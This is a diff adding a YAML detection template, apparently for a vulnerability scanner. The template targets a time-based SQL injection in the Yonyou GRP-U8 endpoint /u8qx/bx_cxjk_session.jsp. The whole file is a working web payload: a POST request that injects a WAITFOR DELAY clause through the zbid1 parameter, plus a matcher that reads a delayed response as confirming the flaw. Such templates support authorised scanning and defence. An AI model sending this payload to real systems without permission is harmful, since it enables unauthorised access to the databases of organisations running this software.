@@ -1,0 +1,25 @@
+id: poc-yaml-grp-u8-bx-cxjk-session-jsp-sqli
+info:
+  name: 用友GRP-U8 bx_cxjk_session.jsp SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: GRP-U8
+variables:
+  t1: random_int(5,10)
+requests:
+- method: POST
+  path: /u8qx/bx_cxjk_session.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: rowID=1&djbh1=123&cxje1=1&zbid1=1')WAITFOR+DELAY+'0:0:8'--+
+  expression: 'status_code == 200
+
+    && contains(body,"{\"rows\":[],\"state\":\"1\"}")
+
+    && !contains(body,"<")
+
+    && duration > t1
+
+    '
+transport: http
